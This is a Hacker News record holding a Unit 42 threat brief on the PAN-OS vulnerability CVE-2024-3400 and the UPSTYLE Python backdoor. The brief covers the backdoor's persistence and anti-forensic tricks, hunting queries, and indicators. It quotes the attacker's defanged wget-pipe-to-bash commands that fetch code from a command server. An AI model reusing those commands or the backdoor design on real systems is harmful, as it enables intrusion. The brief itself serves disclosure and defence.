{"aid": "40015831", "title": "OS Command Injection Vulnerability in GlobalProtect Gateway", "url": "https://unit42.paloaltonetworks.com/cve-2024-3400/", "domain": "paloaltonetworks.com", "votes": 1, "user": "firebaze", "posted_at": "2024-04-12 18:04:43", "comments": 0, "source_title": "Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400", "source_text": "Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to\nCVE-2024-3400\n\nSearch\n\n  * Tech Docs\n\n# Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related\nto CVE-2024-3400\n\n  * 3,181\n\npeople reacted\n\n  * 9\n  * 7 min. read\n\nBy Unit 42\n\nApril 12, 2024 at 10:00 AM\n\nCategory: Vulnerability\n\nTags: Command Injection, CVE-2024-3400, MidnightEclipse, Python\n\n## Executive Summary\n\nPalo Alto Networks and Unit 42 are engaged in tracking activity related to\nCVE-2024-3400 and are working with external researchers, partners and\ncustomers to share information transparently and rapidly.\n\nA critical command injection vulnerability in Palo Alto Networks PAN-OS\nsoftware enables an unauthenticated attacker to execute arbitrary code with\nroot privileges on the firewall. The vulnerability, assigned CVE-2024-3400,\nhas a CVSS score of 10.0.\n\nThis issue is applicable only to PAN-OS 10.2, PAN-OS 11.0 and PAN-OS 11.1\nfirewall configurations with a GlobalProtect gateway and device telemetry\nenabled. This issue does not affect cloud firewalls (Cloud NGFW), Panorama\nappliances or Prisma Access. For up-to-date information about affected\nproducts and versions, please refer to the Palo Alto Networks Security\nAdvisory on this issue.\n\nPalo Alto Networks is aware of malicious exploitation of this issue. We are\ntracking the initial exploitation of this vulnerability under the name\nOperation MidnightEclipse, as we assess with high confidence that known\nexploitation we\u2019ve analyzed thus far is limited to a single threat actor. We\nalso assess that additional threat actors may attempt exploitation in the\nfuture.\n\nThis threat brief will cover information about the vulnerability and what we\nknow about post-exploitation. We will share interim guidance to mitigate the\nvulnerability, though readers should also refer to the security advisory for\nspecific product version information and remediation guidance. We will\ncontinue to update this threat brief as more information becomes available.\n\nIf you believe your firewall has been compromised, please reach out to Palo\nAlto Networks support.\n\nThis issue will be fixed in an upcoming release of PAN-OS 10.2, PAN-OS 11.0,\nPAN-OS 11.1 and all later PAN-OS versions by ETA April 14, 2024.\n\nAs a matter of best practice, Palo Alto Networks recommends that you monitor\nyour network for abnormal activity and investigate any unexpected network\nactivity.\n\nWe would like to thank Volexity for finding this issue and their continuing\ncoordination and partnership. Please reference Volexity\u2019s blog for their\nanalysis.\n\nPalo Alto Networks customers receive protections from and mitigations for\nCVE-2024-3400 and malware used in post-exploitation activity in the following\nways:\n\nPalo Alto Networks recommends customers with a Threat Prevention subscription\nblock attacks for this vulnerability by enabling Threat ID 95187 (introduced\nin Applications and Threats content version 8833-8682). In addition to\nenabling Threat ID 95187, customers must ensure vulnerability protection has\nbeen applied to their GlobalProtect interface to prevent exploitation of this\nissue on their device. Please see the relevant LIVEcommunity article for more\ninformation.\n\nIf you are unable to apply the Threat Prevention based mitigation at this\ntime, you can still mitigate the impact of this vulnerability by temporarily\ndisabling device telemetry until the device is upgraded to a fixed PAN-OS\nversion. Once upgraded, device telemetry should be re-enabled on the device.\n\nThe Managed Threat Hunting section below includes XQL queries that can be used\nto search for signs of exploitation of this CVE.\n\nThe Unit 42 Incident Response team can also be engaged to help with a\ncompromise or to provide a proactive assessment to lower your risk.\n\nVulnerabilities Discussed| CVE-2024-3400  \n---|---  \n  \n## Table of Contents\n\nDetails of the Vulnerability Current Scope of the Attack Interim Guidance Unit\n42 Managed Threat Hunting Queries Conclusion Palo Alto Networks Product\nProtections for CVE-2024-3400 Next-Generation Firewalls and Prisma Access With\nAdvanced Threat Prevention Cortex XDR, XSIAM and the Unified Cloud Agent\nIndicators of Compromise UPSTYLE Backdoor Command and Control Infrastructure\nHosted Python Backdoor Observed Commands Additional Resources\n\n## Details of the Vulnerability\n\nA command injection vulnerability in Palo Alto Networks PAN-OS software\nenables an unauthenticated attacker to execute arbitrary code with root\nprivileges on the firewall. This issue is applicable only to PAN-OS 10.2, PAN-\nOS 11.0 and PAN-OS 11.1 firewall configurations with both a GlobalProtect\ngateway and device telemetry enabled.\n\nYou can verify whether you have these features configured by checking for\nentries in your firewall web interface. Our security advisory includes a link\nto further instructions on how to temporarily disable device telemetry.\n\nPalo Alto Networks is aware of targeted attacks that leverage this\nvulnerability. The next section covers details of the post-exploitation\nactivity we\u2019ve observed.\n\n## Current Scope of the Attack\n\nAs part of the activity observed in Operation MidnightEclipse, after\nexploitation, the threat actor created a cronjob that would run every minute\nto access commands hosted on an external server that would execute via bash,\nas seen in the following command:\n\n  * wget -qO- hxxp://172.233.228[.]93/policy | bash\n\nWe were unable to access the commands executed via this URL. However, we\nbelieve this URL was used to deploy a second Python-based backdoor, which our\ncolleagues at Volexity referred to as UPSTYLE.\n\nThe UPSTYLE backdoor uploaded to the firewall was hosted at\nhxxp://144.172.79[.]92/update.py, but we saw a similar backdoor hosted at\nnhdata.s3-us-west-2.amazonaws[.]com. According to the HTTP headers, it appears\nthe threat actor last modified it on April 7, 2024.\n\n12345678910111213| Accept-Ranges: bytesContent-Length: 5187Content-Type:\napplication/octet-streamDate: Thu, 11 Apr 2024 16:12:16 GMTEtag:\n\"6612443d-1443\"Last-Modified: Sun, 07 Apr 2024 06:59:09 GMTServer:\nnginx/1.18.0 (Ubuntu)  \n---|---  \n  \nThe update.py file hosted at 144.172.79[.]92 has a SHA256 value of\n3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac. This file is\na backdoor that has multiple layers.\n\nFirst, update.py writes another Python script to the following location:\n\n  * [snip]/site-packages/system.pth\n\nThe Python script written to system.pth Base64 decodes an embedded Python\nscript and executes it. This embedded Python script has two functions named\nprotect and check, which are called in that order. The protect function sends\na SIGTERM signal and writes the contents of the system.pth file back to\nitself, likely as a persistence mechanism. The check function will read\n/proc/self/cmdline to see if it is running as monitor mp before running\nanother Base64 embedded Python script, which is the functional backdoor.\n\nThe Python script run by system.pth has a function named __main that will run\nin a thread. This function first reads the contents of the following file,\nalong with its access and modified times:\n\n  * [snip]/css/bootstrap.min.css\n\nIt then enters an infinite loop that iterates once every two seconds, reading\nin the following file:\n\n  * [snip]/sslvpn_ngx_error.log\n\nThe script will then iterate through each line of the file and search the line\nfor the threat actor's command using the following regular expression:\n\n  * img\\\\[([a-zA-Z0-9+/=]+)\\\\]\n\nIf the above regular expression matches, the script will Base64 encode the\ncontents of the command and run it using the popen method within Python's OS\nmodule. The lines of the sslvpn_ngx_error.log file that do not match the\nregular expression are written back to the file, which essentially prunes the\nlines that contain commands from persisting in the sslvpn_ngx_error.log file\nfor later analysis.\n\nAfter running the command, the script writes the output of the command to the\nfollowing file:\n\n  * [snip]/css/bootstrap.min.css\n\nThe script will then create another thread that runs a function called\nrestore. The restore function takes the original content of the\nbootstrap.min.css file, as well as the original access and modified times,\nsleeps for 15 seconds and writes the original contents back to the file and\nsets the access and modified times to their originals. The point of this\nfunction is to avoid leaving the output of the commands available for\nanalysis. Also, this suggests that the threat actor has automation built into\nthe client side of this backdoor, as they only have 15 seconds to grab the\nresults before the backdoor overwrites the file.\n\nUsing the initial backdoor in the crontab, we have evidence of a handful of\nthe commands the threat actor ran on the firewall. The commands include\ncopying configuration files to the web application folder and exfiltrating\nthem via HTTP requests to those files. The following IP address was seen\nattempting to access a specific configuration file copied to this folder,\nwhich we believe is a VPN used by the threat actor:\n\n  * 66.235.168[.]222\n\nWe also observed the threat actor running another command to receive commands\nfrom a slightly different URL as the cronjob backdoor:\n\n  * wget -qO- hxxp://172.233.228[.]93/patch|bash\n\nLastly, the threat actor cleaned up after themselves by removing all files\nassociated with the backdoors and clearing their cronjobs.\n\n## Interim Guidance\n\nPlease refer to the Palo Alto Networks security advisory on CVE-2024-3400 for\nthe most current interim guidance for mitigating the vulnerability.\n\n## Unit 42 Managed Threat Hunting Queries\n\nThe Unit 42 Managed Threat Hunting team continues to track any attempts to\nexploit this CVE across our customers, using Cortex XDR and the XQL queries\nbelow. Cortex XDR customers can also use these XQL queries to search for signs\nof exploitation.\n\n1234| // Description: Search for domain IOC in raw NGFW logsdataset =\npanw_ngfw_url_raw| filter url_domain ~= \".*nhdata.s3-us-west-2.amazonaws.com\"|\nfields _time, log_source_name, action, app, url_domain, uri, url_category,\nsource_ip, source_port, dest_ip, dest_port, protocol, rule_matched,\nrule_matched_uuid  \n---|---  \n  \n12345| // Description: Detect hits for the specific prevention signature for\nCVE-2024-3400config case_sensitive = false| dataset = panw_ngfw_threat_raw|\nfilter threat_id = \"95187\"| fields _time, log_source_name, action,\napp_category, app_sub_category, threat_id, threat_name, source_ip,\nsource_port, dest_ip, dest_port, *  \n---|---  \n  \n12345| // Description: Hits for known IOCs in NGFW trafficconfig\ncase_sensitive = false| dataset = panw_ngfw_traffic_raw| filter source_ip in\n(\"66.235.168.222\", \"144.172.79.92\", \"172.233.228.93\") or dest_ip in\n(\"66.235.168.222\", \"144.172.79.92\", \"172.233.228.93\")| fields _time,\nlog_source_name, action, action_source, app, bytes_sent, bytes_received,\nbytes_total, source_ip, source_port, dest_ip, dest_port, protocol,\nrule_matched, rule_matched_uuid, session_end_reason  \n---|---  \n  \n123456| // Description: Hits for known IOCs in XDR telemetry and NGFW\ntelemetry (assuming proper integration of NGFW)config case_sensitive = false|\ndataset = xdr_data| filter event_type = ENUM.STORY| filter action_remote_ip in\n(\"172.233.228.93\", \"66.235.168.222\", \"144.172.79.92\") OR dns_query_name ~=\n\".nhdata.s3-us-west-2.amazonaws.com\" OR action_external_hostname ~=\n\".nhdata.s3-us-west-2.amazonaws.com\"| fields _time, agent_hostname,\nactor_process_image_name, action_local_ip, action_remote_ip,\naction_remote_port, dns_query_name, action_external_hostname  \n---|---  \n  \n## Conclusion\n\nThe security advisory will continue to provide up to date information on\nimpacts to Palo Alto Networks products and recommended mitigations. We will\ncontinue to update this threat brief with information on exploitation.\n\nAgain, Palo Alto Networks would like to thank Volexity for finding this issue\nand their continuing coordination and partnership. Please reference Volexity\u2019s\nblog for their analysis.\n\nPalo Alto Networks has shared our findings with our fellow Cyber Threat\nAlliance (CTA) members. CTA members use this intelligence to rapidly deploy\nprotections to their customers and to systematically disrupt malicious cyber\nactors. Learn more about the Cyber Threat Alliance.\n\nProtections and mitigations for the observed exploitation activity are below\nand will be updated as more become available.\n\n## Palo Alto Networks Product Protections for CVE-2024-3400\n\nPalo Alto Networks customers can leverage a variety of product protections and\nupdates to identify and defend against this threat.\n\nIf you think you may have been compromised or have an urgent matter, get in\ntouch with the Unit 42 Incident Response team or call:\n\n  * North America Toll-Free: 866.486.4842 (866.4.UNIT42)\n  * EMEA: +31.20.299.3130\n  * APAC: +65.6983.8730\n  * Japan: +81.50.1790.0200\n\n### Next-Generation Firewalls and Prisma Access With Advanced Threat\nPrevention\n\nNext-Generation Firewall with the Advanced Threat Prevention security\nsubscription can help block exploitation of CVE-2024-3400 via Threat\nPrevention signature: 95187.\n\n### Cortex XDR, XSIAM and the Unified Cloud Agent\n\nCortex XDR and XSIAM agents and analytics help protect against post-\nexploitation activity if an attacker tries to enumerate or laterally move to\nother assets.\n\n## Indicators of Compromise\n\n### UPSTYLE Backdoor\n\n  * Update.py\n  * 3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac\n  * 5460b51da26c060727d128f3b3d6415d1a4c25af6a29fef4cc6b867ad3659078\n\n### Command and Control Infrastructure\n\n  * 172.233.228[.]93\n  * hxxp://172.233.228[.]93/policy\n  * hxxp://172.233.228[.]93/patch\n  * 66.235.168[.]222\n\n### Hosted Python Backdoor\n\n  * 144.172.79[.]92\n  * nhdata.s3-us-west-2.amazonaws[.]com\n\n### Observed Commands\n\n  * wget -qO- hxxp://172.233.228[.]93/patch|bash\n  * wget -qO- hxxp://172.233.228[.]93/policy | bash\n\n## Additional Resources\n\n  * CVE-2024-3400 PAN-OS: OS Command Injection Vulnerability in GlobalProtect Gateway \u2013 Palo Alto Networks\n  * Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400) \u2013 Volexity\n  * Palo Alto Networks Releases Guidance for Vulnerability in PAN-OS, CVE-2024-3400 \u2013 Cybersecurity and Infrastructure Security Agency (CISA)\n\nUpdated April 12, 2024, at 10:15 a.m. PT to add Cortex XDR and XSIAM product\nprotections, as well as Additional Resources.\n\n#### Get updates from Palo Alto Networks!\n\nSign up to receive the latest news, cyber threat intelligence and research\nfrom us\n\nBy submitting this form, you agree to our Terms of Use and acknowledge our\nPrivacy Statement.\n\n#### Popular Resources\n\n  * Resource Center\n  * Blog\n  * Communities\n  * Tech Docs\n  * Unit 42\n  * Sitemap\n\n#### Legal Notices\n\n  * Privacy\n  * Terms of Use\n  * Documents\n\n#### Account\n\n  * Manage Subscriptions\n  * Report a Vulnerability\n\n\u00a9 2024 Palo Alto Networks, Inc. All rights reserved.\n\nThis site uses cookies essential to its operation, for analytics, and for\npersonalized content and ads. Please read our privacy statement for more\ninformation.Privacy statement\n\nYour Opt Out Preference Signal is Honored\n\n## Privacy Preference Center\n\nWhen you visit any website, it may store or retrieve information on your\nbrowser, mostly in the form of cookies. This information might be about you,\nyour preferences or your device and is mostly used to make the site work as\nyou expect it to. The information does not usually directly identify you, but\nit can give you a more personalized web experience. Because we respect your\nright to privacy, you can choose not to allow some types of cookies. Click on\nthe different category headings to find out more and change our default\nsettings. However, blocking some types of cookies may impact your experience\nof the site and the services we are able to offer. More information on cookie\nconsent\n\n### Manage Your Consent Preferences\n\n#### Strictly Necessary Cookies\n\nAlways Active\n\nThese cookies are necessary for the website to function and cannot be switched\noff in our systems. They are usually only set in response to actions made by\nyou which amount to a request for services, such as setting your privacy\npreferences, logging in or filling in forms. You can set your browser to block\nor alert you about these cookies, but some parts of the site will not then\nwork. These cookies do not store any personally identifiable information.\n\n#### Performance Cookies\n\nThese cookies allow us to count visits and traffic sources so we can measure\nand improve the performance of our site. They help us to know which pages are\nthe most and least popular and see how visitors move around the site. All\ninformation these cookies collect is aggregated and therefore anonymous. If\nyou do not allow these cookies we will not know when you have visited our\nsite, and will not be able to monitor its performance.\n\n#### Functional Cookies\n\nThese cookies enable the website to provide enhanced functionality and\npersonalisation. They may be set by us or by third party providers whose\nservices we have added to our pages. If you do not allow these cookies then\nsome or all of these services may not function properly.\n\n#### Targeting Cookies\n\nThese cookies may be set through our site by our advertising partners. They\nmay be used by those companies to build a profile of your interests and show\nyou relevant adverts on other sites. They do not store directly personal\ninformation, but are based on uniquely identifying your browser and internet\ndevice. If you do not allow these cookies, you will experience less targeted\nadvertising.\n\n### Cookie List\n\nlabel\n\nConsent Leg.Interest\n\nlabel\n\nlabel\n\nlabel\n\n", "frontpage": false}
